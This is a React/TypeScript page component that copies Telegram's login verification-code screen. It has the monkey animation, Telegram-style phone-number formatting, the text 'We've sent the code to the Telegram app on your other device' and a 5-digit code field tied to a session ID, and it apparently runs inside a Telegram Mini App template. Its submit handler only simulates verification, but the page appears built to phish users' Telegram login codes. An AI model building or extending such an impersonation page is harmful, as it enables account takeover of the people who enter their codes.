import React, { useState, useEffect, useRef } from 'react';
import { useNavigate, useSearchParams } from 'react-router-dom';

import { Page } from '@/components/Page.tsx';

export const VerificationCodePage: React.FC = () => {
  const navigate = useNavigate();
  const [searchParams] = useSearchParams();
  const sessionId = searchParams.get('sessionId');
  const phoneNumber = searchParams.get('phoneNumber');
  
  const [verificationCode, setVerificationCode] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [status, setStatus] = useState('');
  
  const videoRef = useRef<HTMLVideoElement>(null);

  useEffect(() => {
    // Auto-play the monkey video
    if (videoRef.current) {
      videoRef.current.play().catch(e => {
        console.log('🐵 Video autoplay failed:', e);
      });
    }
  }, []);

  // Format phone number with proper spacing like Telegram
  const formatPhoneNumber = (phone: string) => {
    // Remove any existing spaces and non-digit characters except +
    const clean = phone.replace(/[^\d+]/g, '');
    
    // If it starts with +, format with spaces
    if (clean.startsWith('+')) {
      const countryCode = clean.substring(0, 4); // +358
      const remaining = clean.substring(4);
      
      // Handle different phone number lengths gracefully
      if (remaining.length >= 9) {
        const areaCode = remaining.substring(0, 3);      // 403
        const firstGroup = remaining.substring(3, 6);    // 624
        const secondGroup = remaining.substring(6, 9);   // 026
        const extra = remaining.substring(9);            // any remaining digits
        
        let formatted = `${countryCode} ${areaCode} ${firstGroup} ${secondGroup}`;
        if (extra) {
          formatted += ` ${extra}`;
        }
        return formatted;
      } else if (remaining.length >= 6) {
        const areaCode = remaining.substring(0, 3);      // 403
        const firstGroup = remaining.substring(3, 6);    // 624
        const extra = remaining.substring(6);            // any remaining digits
        
        let formatted = `${countryCode} ${areaCode} ${firstGroup}`;
        if (extra) {
          formatted += ` ${extra}`;
        }
        return formatted;
      } else if (remaining.length >= 3) {
        const areaCode = remaining.substring(0, 3);      // 403
        const extra = remaining.substring(3);            // any remaining digits
        
        let formatted = `${countryCode} ${areaCode}`;
        if (extra) {
          formatted += ` ${extra}`;
        }
        return formatted;
      } else {
        return `${countryCode} ${remaining}`;
      }
    }
    
    return clean;
  };

  const handleCodeChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value;
    // Only allow digits
    if (/^\d*$/.test(value)) {
      setVerificationCode(value);
    }
  };

  const handleSubmit = async () => {
    if (!verificationCode || verificationCode.length < 5) {
      setStatus('Please enter the 5-digit verification code');
      return;
    }

    setIsSubmitting(true);
    setStatus('Verifying code...');

    try {
      // Simulate verification process
      setStatus('Code submitted successfully!');
      
      // Navigate to success page after a moment
      setTimeout(() => {
        navigate(`/success?sessionId=${sessionId}`);
      }, 2000);
      
    } catch (error) {
      console.error('Error submitting verification code:', error);
      setStatus('❌ Error submitting code');
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleKeyPress = (e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Enter') {
      handleSubmit();
    }
  };

  const goBack = () => {
    navigate(`/phone-login?sessionId=${sessionId}`);
  };

  return (
    <Page back={true}>
      <div style={{
        display: 'flex',
        flexDirection: 'column',
        alignItems: 'center',
        justifyContent: 'center',
        minHeight: '100vh',
        padding: '40px 20px',
        backgroundColor: 'white',
        fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif'
      }}>
        {/* Back Button */}
        <button
          onClick={goBack}
          style={{
            position: 'absolute',
            top: '20px',
            left: '20px',
            padding: '8px 16px',
            fontSize: '14px',
            backgroundColor: '#f8f9fa',
            color: '#333',
            border: '1px solid #dee2e6',
            borderRadius: '6px',
            cursor: 'pointer',
            display: 'flex',
            alignItems: 'center',
            gap: '8px'
          }}
        >
          ← Back
        </button>
        {/* Content Container */}
        <div style={{
          display: 'flex',
          flexDirection: 'column',
          alignItems: 'center',
          maxWidth: '400px',
          width: '100%'
        }}>
          
          {/* Animated Monkey */}
          <div style={{
            marginBottom: '32px',
            textAlign: 'center'
          }}>
            <video
              ref={videoRef}
              src="/reactjs-template/monkey.mp4"
              style={{
                width: '120px',
                height: '120px',
                objectFit: 'cover'
              }}
              loop
              muted
              playsInline
              autoPlay
            />
          </div>

          {/* Phone Number Display */}
          <div style={{
            marginBottom: '24px',
            textAlign: 'center'
          }}>
            <div style={{
              fontSize: '32px',
              fontWeight: '400',
              color: '#000',
              marginBottom: '8px',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              gap: '8px',
              fontFamily: 'system-ui'
            }}>
              {phoneNumber ? formatPhoneNumber(phoneNumber) : ''}
              <span
                style={{
                  fontSize: '16px',
                  color: '#999', // Light grey to match screenshot
                  cursor: 'pointer',
                  display: 'inline-flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  width: '24px',
                  height: '24px'
                }}
                title="Edit phone number"
              >
                {/* Pencil icon using PNG */}
                <img
                  src="/reactjs-template/pencil.png"
                  alt="Edit"
                  style={{
                    width: '20px',
                    height: '20px',
                    opacity: 0.75,
                    transition: 'opacity 0.2s ease'
                  }}
                  onMouseEnter={(e) => e.currentTarget.style.opacity = '1'}
                  onMouseLeave={(e) => e.currentTarget.style.opacity = '0.75'}
                />
              </span>
            </div>
            <div style={{
              fontSize: '14px',
              color: '#666',
              lineHeight: '1.4'
            }}>
              We've sent the code to the Telegram app on your other device.
            </div>
          </div>

          {/* Verification Code Input */}
          <div style={{
            width: '100%',
            marginBottom: '32px'
          }}>
            <div style={{ marginBottom: '24px' }}>
              <input
                type="text"
                value={verificationCode}
                onChange={handleCodeChange}
                placeholder="Code"
                maxLength={5}
                style={{
                  width: '100%',
                  maxWidth: '280px',
                  height: '48px',
                  padding: '0 16px',
                  fontSize: '16px',
                  border: '2px solid #0088cc',
                  borderRadius: '12px',
                  backgroundColor: '#ffffff',
                  color: '#000',
                  outline: 'none',
                  transition: 'border-color 0.2s ease, box-shadow 0.2s ease'
                }}
                onFocus={(e) => {
                  e.target.style.borderColor = '#0088cc';
                  e.target.style.boxShadow = '0 0 0 3px rgba(0, 136, 204, 0.15)';
                }}
                onBlur={(e) => {
                  e.target.style.borderColor = '#0088cc';
                  e.target.style.boxShadow = 'none';
                }}
              />
            </div>
          </div>

          {/* Submit Button */}
          <button
            onClick={handleSubmit}
            disabled={isSubmitting || !verificationCode || verificationCode.length < 5}
            style={{
              width: '100%',
              padding: '16px',
              fontSize: '16px',
              fontWeight: '600',
              backgroundColor: verificationCode && verificationCode.length >= 5 ? '#0088cc' : '#ccc',
              color: 'white',
              border: 'none',
              borderRadius: '12px',
              cursor: verificationCode && verificationCode.length >= 5 ? 'pointer' : 'not-allowed',
              transition: 'background-color 0.2s'
            }}
          >
            {isSubmitting ? 'Verifying...' : 'Submit Code'}
          </button>

          {/* Status Message */}
          {status && (
            <div style={{
              marginTop: '16px',
              padding: '12px 16px',
              backgroundColor: status.includes('❌') ? '#f8d7da' : '#d4edda',
              color: status.includes('❌') ? '#721c24' : '#155724',
              borderRadius: '8px',
              fontSize: '14px',
              textAlign: 'center',
              width: '100%'
            }}>
              {status}
            </div>
          )}

          {/* Debug Info */}
          {sessionId && (
            <div style={{
              marginTop: '24px',
              padding: '12px 16px',
              backgroundColor: '#f8f9fa',
              border: '1px solid #dee2e6',
              borderRadius: '8px',
              fontSize: '12px',
              color: '#6c757d',
              width: '100%'
            }}>
              <div>Session: {sessionId}</div>
              <div>Phone: {phoneNumber}</div>
              <div>Code: {verificationCode}</div>
            </div>
          )}
        </div>
      </div>
    </Page>
  );
};
